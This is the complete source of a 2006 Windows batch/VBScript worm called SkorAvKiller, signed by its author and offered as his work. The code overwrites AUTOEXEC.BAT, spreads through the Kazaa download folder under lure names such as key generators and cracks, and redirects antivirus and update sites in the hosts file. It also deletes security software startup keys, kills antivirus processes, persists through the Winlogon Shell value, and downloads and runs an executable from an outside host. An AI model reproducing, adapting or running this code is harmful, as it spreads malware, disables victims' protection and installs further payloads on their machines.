rem // P2P-Worm.BAT.Dldr.SkorAvKiller Version A �opyrights 2006 by sk0r
rem // This Worm was created by sk0r aka Czybik.
rem // ViSiT my Site @ www.sk0r-virii.tk & www.sk0r-scripts.tk
rem // 
rem  // Yes, I know this is 'only' a Batch Worm!
rem  // But, I tought batch worms are skilled, too.
rem  // So i made this one. And now I think, it really
rem  // owns. It has 5 Subs.
rem // 
rem // ========================================================

@echo off
title SkorAvKiller by sk0r aka Czybik 
@echo off
color 3E
set Slash=\
rem echo %SystemDrive%%slash%

cls
GoTo CopyToAutoexec

:CopyToAutoexec
echo 'SkorAvKiller Tochter VBScript >> copy.vbs
echo '====================================== >> copy.vbs
echo set fso=createobject("scripting.filesystemobject") >> copy.vbs
echo set windir=fso.getspecialfolder(0) >> copy.vbs
echo set wshs = createobject("wscript.shell") >> copy.vbs
echo Hdddisk=left(windir,2) >> copy.vbs
echo set lol = fso.opentextfile(%0) >> copy.vbs
echo readbatch=lol.readall >> copy.vbs
echo lol.close >> copy.vbs
echo set kaka = fso.getfile(Hdddisk+"\AUTOEXEC.BAT") >> copy.vbs
echo kaka.attributes = kaka.attributes - 4 >> copy.vbs
echo kaka.attributes = kaka.attributes - 2 >> copy.vbs
echo kaka.attributes = kaka.attributes - 1 >> copy.vbs
echo fso.deletefile(hdddisk+"\AUTOEXEC.BAT") >> copy.vbs
echo set rofl = fso.CreateTextFile(Hdddisk+"\AUTOEXEC.BAT")  >> copy.vbs
echo rofl.write readbatch >> copy.vbs
echo rofl.close >> copy.vbs
echo set kaka2= fso.getfile(Hdddisk+"\AUTOEXEC.BAT") >> copy.vbs
echo kaka2.attributes = kaka2.attributes + 4 >> copy.vbs
echo kaka2.attributes = kaka2.attributes + 1 >> copy.vbs
echo kaka2.attributes = kaka2.attributes + 2 >> copy.vbs
echo wscript.quit >> copy.vbs
copy.vbs
del copy.vbs
GoTo PeerToPeerSpread

:PeerToPeerSpread
echo ' P2P-Spreading.bat by sk0r alias Czybik >> p2pspread.vbs
echo On Error Resume Next >> p2pspread.vbs
echo set fso=createobject("scripting.filesystemobject") >> p2pspread.vbs
echo set wshs = createobject("wscript.shell") >> p2pspread.vbs
echo s_kazza = wshs.regread("HKEY_CURRENT_USER\Software\Kazaa\LocalContent\" + "DownloadDir") >> p2pspread.vbs
echo If Not s_kazza = "" Then >> p2pspread.vbs
echo Set getforkazaa = fso.getfile(%0) >> p2pspread.vbs
echo getforkazaa.Copy (s_kazza + "\win_xp_serial.txt.bat") >> p2pspread.vbs
echo getforkazaa.Copy (s_kazza + "\Microsoft MSN Messenger 7.5 Hack.bat") >> p2pspread.vbs
echo getforkazaa.Copy (s_kazza + "\paintshop_pro_crack.exe.bat") >> p2pspread.vbs
echo getforkazaa.Copy (s_kazza + "\win_xp_serial.txt.bat") >> p2pspread.vbs
echo getforkazaa.Copy (s_kazza + "\icq_5_antispam.exe.bat") >> p2pspread.vbs
echo getforkazaa.Copy (s_kazza + "\Kaspersky_Key_Gen.bat") >> p2pspread.vbs
echo getforkazaa.Copy (s_kazza + "\TeamSpeak_2RC2_Hacker.bat") >> p2pspread.vbs
echo getforkazaa.Copy (s_kazza + "\Zip_passw_cracker.bat") >> p2pspread.vbs
echo getforkazaa.Copy (s_kazza + "\official_winxp_keyHacker.bat") >> p2pspread.vbs
echo getforkazaa.Copy (s_kazza + "\HackerTool_2006.bat") >> p2pspread.vbs
echo getforkazaa.Copy (s_kazza + "\SourceCode_winxp_sp2.log.bat") >> p2pspread.vbs
echo End If >> p2pspread.vbs
p2pspread.vbs
del p2pspread.vbs
GoTo AllAvCode

:AllAvCode
echo 'This is a part of SkorAvKiller Version A �opyrights 2006 by sk0r (Czybik) >> %SystemRoot%%Slash%avprocc.vbs
echo On Error Resume Next >> %SystemRoot%%Slash%avprocc.vbs
echo Set fso = CreateObject ("Scripting.FileSystemObject") >> %SystemRoot%%Slash%avprocc.vbs
echo Set sysdir = fso.getspecialfolder(1) >> %SystemRoot%%Slash%avprocc.vbs
echo set windir = fso.getspecialfolder(0) >> %SystemRoot%%Slash%avprocc.vbs
echo Set wshs = CreateObject("wscript.shell") >> %SystemRoot%%Slash%avprocc.vbs
echo Set wmiObject = GetObject("winmgmts:") >> %SystemRoot%%Slash%avprocc.vbs
echo Set inSystem = wmiObject.InstancesOf("Win32_Process") >> %SystemRoot%%Slash%avprocc.vbs
echo if not fso.fileexists(windir+"\avprocc.vbs") then >> %SystemRoot%%Slash%avprocc.vbs
echo set gtMy = fso.getfile(wscript.scriptfullname) >> %SystemRoot%%Slash%avprocc.vbs
echo gtMy.copy (windir+"\avprocc.vbs") >> %SystemRoot%%Slash%avprocc.vbs
echo end if >> %SystemRoot%%Slash%avprocc.vbs
echo localhostip = Chr(49) + Chr(50) + Chr(55) + Chr(46) + Chr(48) + Chr(46) + Chr(48) + Chr(46) + Chr(49) >> %SystemRoot%%Slash%avprocc.vbs
echo Set hostfile = fso.createtextfile(sysdir + "\drivers\etc\hosts", True)  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline ("# Don't allow you to visit av sites")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (" ")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.antivir.de")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.bitdefender.de ")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.virustotal.com")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " virusscan.jotti.org")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.kaspersky.com")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.sophos.de")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.trojaner-info.de ")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.trojaner-help.de ")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.arcabit.com ")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.avast.com ")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.grisoft.com ")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.bitdefender.com ")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.clamav.net ")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.drweb.com ")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.f-prot.com ")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.fortinet.com")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.nod32.com ")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.norman.com ")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.microsoft.com")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.anti-virus.by/en")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.symantec.com ")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.windowsupdate.com ")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.trendmicro.com ")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.mcafee.com ")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.viruslist.com")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.avp.com ")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.zonelabs.com")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.antivirus-online.de")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.free-av.com ")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.panda-software.com")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.antiviruslab.com")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.lavasoft.de")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.writeline (localhostip + " www.virus-aktuell.de")  >> %SystemRoot%%Slash%avprocc.vbs
echo hostfile.close >> %SystemRoot%%Slash%avprocc.vbs
echo wshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\avgnt" >> %SystemRoot%%Slash%avprocc.vbs
echo wshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\KAVPersonal50" >> %SystemRoot%%Slash%avprocc.vbs
echo wshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\AVG7_CC" >> %SystemRoot%%Slash%avprocc.vbs
echo wshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\BDMCon" >> %SystemRoot%%Slash%avprocc.vbs
echo wshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\BDNewsAgent" >> %SystemRoot%%Slash%avprocc.vbs
echo wshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\BDOESRV" >> %SystemRoot%%Slash%avprocc.vbs
echo wshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\pccguide.exe" >> %SystemRoot%%Slash%avprocc.vbs
echo wshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\DrWebScheduler" >> %SystemRoot%%Slash%avprocc.vbs
echo wshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SpIDerMail" >> %SystemRoot%%Slash%avprocc.vbs
echo wshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SpIDerNT" >> %SystemRoot%%Slash%avprocc.vbs
echo wshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MCAgentExe" >> %SystemRoot%%Slash%avprocc.vbs
echo wshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MCUpdateExe" >> %SystemRoot%%Slash%avprocc.vbs
echo wshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\OASClnt" >> %SystemRoot%%Slash%avprocc.vbs
echo wshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VirusScan Online" >> %SystemRoot%%Slash%avprocc.vbs
echo wshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VSOCheckTask" >> %SystemRoot%%Slash%avprocc.vbs
echo For Each sp In inSystem >> %SystemRoot%%Slash%avprocc.vbs
echo If LCase(sp.Name) = "avguard.exe" Or LCase(sp.Name) = "avconfig.exe" Or LCase(sp.Name) = "avscan.exe" _ >> %SystemRoot%%Slash%avprocc.vbs
echo Or LCase(sp.Name) = "avcenter.exe" Or LCase(sp.Name) = "avgnt.exe" Or LCase(sp.Name) = "update.exe" _ >> %SystemRoot%%Slash%avprocc.vbs
echo Or LCase(sp.Name) = "preupd.exe" Or LCase(sp.Name) = "avcmd.exe" Or LCase(sp.Name) = "avesvc.exe" Then >> %SystemRoot%%Slash%avprocc.vbs
echo sp.Terminate (0) >> %SystemRoot%%Slash%avprocc.vbs
echo End If >> %SystemRoot%%Slash%avprocc.vbs
echo If LCase(sp.Name) = "kav.exe" Or LCase(sp.Name) = "kavsvc.exe" Or LCase(sp.Name) = "kavsend.exe" Or _ >> %SystemRoot%%Slash%avprocc.vbs
echo LCase(sp.Name) = "keymanager.exe" Then >> %SystemRoot%%Slash%avprocc.vbs
echo sp.Terminate (0) >> %SystemRoot%%Slash%avprocc.vbs
echo End If >> %SystemRoot%%Slash%avprocc.vbs
echo If LCase(sp.Name) = "agentsvr.exe" Or LCase(sp.Name) = "avgcc.exe" Or LCase(sp.Name) = "avgupsvc.exe" _ >> %SystemRoot%%Slash%avprocc.vbs
echo Or LCase(sp.Name) = "avgamsvr.exe" Then >> %SystemRoot%%Slash%avprocc.vbs
echo sp.Terminate (0) >> %SystemRoot%%Slash%avprocc.vbs
echo End If >> %SystemRoot%%Slash%avprocc.vbs
echo If LCase(sp.Name) = "vsserv.exe" Or LCase(sp.Name) = "bdss.exe" Or LCase(sp.Name) = "xcommsvr.exe" _ >> %SystemRoot%%Slash%avprocc.vbs
echo Or LCase(sp.Name) = "bdnagent.exe" Or LCase(sp.Name) = "bdoesrv.exe" Or LCase(sp.Name) = "bdmcon.exe" _ >> %SystemRoot%%Slash%avprocc.vbs
echo Or LCase(sp.Name) = "bdswitch.exe" Or LCase(sp.Name) = "rtvr.exe" Or LCase(sp.Name) = "bdsubmit.exe" _ >> %SystemRoot%%Slash%avprocc.vbs
echo Or LCase(sp.Name) = "bdlite.exe" Then >> %SystemRoot%%Slash%avprocc.vbs
echo sp.Terminate (0) >> %SystemRoot%%Slash%avprocc.vbs
echo End If >> %SystemRoot%%Slash%avprocc.vbs
echo If LCase(sp.Name) = "agentsvr.exe" Or LCase(sp.Name) = "tmproxy.exe" Or LCase(sp.Name) = "PcCtlCom.exe" _ >> %SystemRoot%%Slash%avprocc.vbs
echo Or LCase(sp.Name) = "pccguide.exe" Or LCase(sp.Name) = "qttask.exe" Or LCase(sp.Name) = "patch.exe" _ >> %SystemRoot%%Slash%avprocc.vbs
echo Or LCase(sp.Name) = "Tmntsrv.exe" Or LCase(sp.Name) = "PccPrm.exe" Then >> %SystemRoot%%Slash%avprocc.vbs
echo sp.Terminate (0) >> %SystemRoot%%Slash%avprocc.vbs
echo End If >> %SystemRoot%%Slash%avprocc.vbs
echo If LCase(sp.Name) = "DrWebUpW.exe" Or LCase(sp.Name) = "spidernt.exe" Or LCase(sp.Name) = "DrWebScd.exe" _ >> %SystemRoot%%Slash%avprocc.vbs
echo Or LCase(sp.Name) = "DrWeb32w.exe" Or LCase(sp.Name) = "drwadins.exe" Then >> %SystemRoot%%Slash%avprocc.vbs
echo sp.Terminate (0) >> %SystemRoot%%Slash%avprocc.vbs
echo End If >> %SystemRoot%%Slash%avprocc.vbs
echo If LCase(sp.Name) = "mcupdui.exe" Or LCase(sp.Name) = "McTskshd.exe" Or LCase(sp.Name) = "McAppIns.exe" _ >> %SystemRoot%%Slash%avprocc.vbs
echo Or LCase(sp.Name) = "mghtml.exe" Or LCase(sp.Name) = "McShield.exe" Or LCase(sp.Name) = "Mcdetect.exe" _ >> %SystemRoot%%Slash%avprocc.vbs
echo Or LCase(sp.Name) = "McVSEscn.exe" Or LCase(sp.Name) = "oasclnt.exe" Or LCase(sp.Name) = "mcvsshld.exe" Then >> %SystemRoot%%Slash%avprocc.vbs
echo sp.Terminate (0) >> %SystemRoot%%Slash%avprocc.vbs
echo End If >> %SystemRoot%%Slash%avprocc.vbs
echo If InStr(sp.Name,"clean") Or InStr(sp.Name,"save") Or InStr(sp.Name,"av") Or InStr(sp.Name,"svr") _ >> %SystemRoot%%Slash%avprocc.vbs
echo Or InStr(sp.Name,"mgr") Or InStr(sp.Name,"syma") Or InStr(sp.Name,"resc") Or InStr(sp.Name,"guar") Then >> %SystemRoot%%Slash%avprocc.vbs
echo sp.Terminate (0) >> %SystemRoot%%Slash%avprocc.vbs
echo End If >> %SystemRoot%%Slash%avprocc.vbs
echo Next >> %SystemRoot%%Slash%avprocc.vbs
%SystemRoot%%Slash%avprocc.vbs
echo 'AutoStarter.vbs AutoStart file >> AutoStarter.vbs
echo set fso=CreateObject("Scripting.FileSystemObject") >> AutoStarter.vbs
echo set windir=fso.GetSpecialFolder(0) >> AutoStarter.vbs
echo set wshs=createobject("wscript.shell") >> AutoStarter.vbs
echo wshs.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell","explorer.exe "+windir+"\avprocc.vbs" >> AutoStarter.vbs
echo WScript.Quit >> AutoStarter.vbs
AutoStarter.vbs
del AutoStarter.vbs
GoTo DldrMalware

:DldrMalware
echo 'Download file for the exe worm >> dldrWorm.vbs
echo On Error Resume Next >> dldrWorm.vbs  
echo Set fso = CreateObject ("Scripting.FileSystemObject") >> dldrWorm.vbs 
echo Set wshs = CreateObject ("WScript.Shell")  >> dldrWorm.vbs 
echo Set sysdir = fso.GetSpecialFolder(1) >> dldrWorm.vbs 
echo set ieObj = CreateObject("InternetExplorer.Application") >> dldrWorm.vbs 
echo ieObj.visible=false  >> dldrWorm.vbs
echo ieObj.Navigate "http://aeq.ae.funpic.de/ShellApiHooker32.exe" >> dldrWorm.vbs 
echo wscript.sleep 4000 >> dldrWorm.vbs
echo muha = "C:\Dokumente und Einstellungen\Daniel1337"  >> dldrWorm.vbs 
echo localsett="\Lokale Einstellungen"   >> dldrWorm.vbs
echo tempifiles="\Temporary Internet Files"  >> dldrWorm.vbs 
echo Set gtfld = fso.getfolder(""+muha+localsett+tempifiles+"\Content.IE5")  >> dldrWorm.vbs 
echo Set subfld = gtfld.subfolders   >> dldrWorm.vbs
echo For Each subfolderin In subfld   >> dldrWorm.vbs
echo set filin = subfolderin.files  >> dldrWorm.vbs 
echo For Each allfiles In filin   >> dldrWorm.vbs
echo If InStr(allfiles.name,"ShellApiHooker32") Then  >> dldrWorm.vbs 
echo set gtExeFile = fso.GetFile (allfiles.path)  >> dldrWorm.vbs
echo gtExeFile.Copy (sysdir+"\ShellApiHooker32.exe")  >> dldrWorm.vbs
echo wshs.run (sysdir+"\ShellApiHooker32.exe")   >> dldrWorm.vbs
echo end if >> dldrWorm.vbs
echo next >> dldrWorm.vbs
echo next >> dldrWorm.vbs
dldrWorm.vbs
del dldrWorm.vbs
GoTo LastMessage

:LastMessage
cls
echo Dear User
echo You have been infected by a worm:
echo .
echo "!== SkorAvKiller Version A ==!"
echo .
echo This worm was made by sk0r alias Czybik
echo Visit www.sk0r-scripts.tk & echo www.sk0r-virii.tk & echo www.czybik-kit.tk
echo . 
echo This worm shows that batch worms are skilled, too :-D
echo Ok, have fun with that worm! It really ownes ^
echo .
echo .
pause


rem // <!-- P2P-Worm.BAT.Dldr.SkorAvKiller Version A | �2006 by sk0r --!>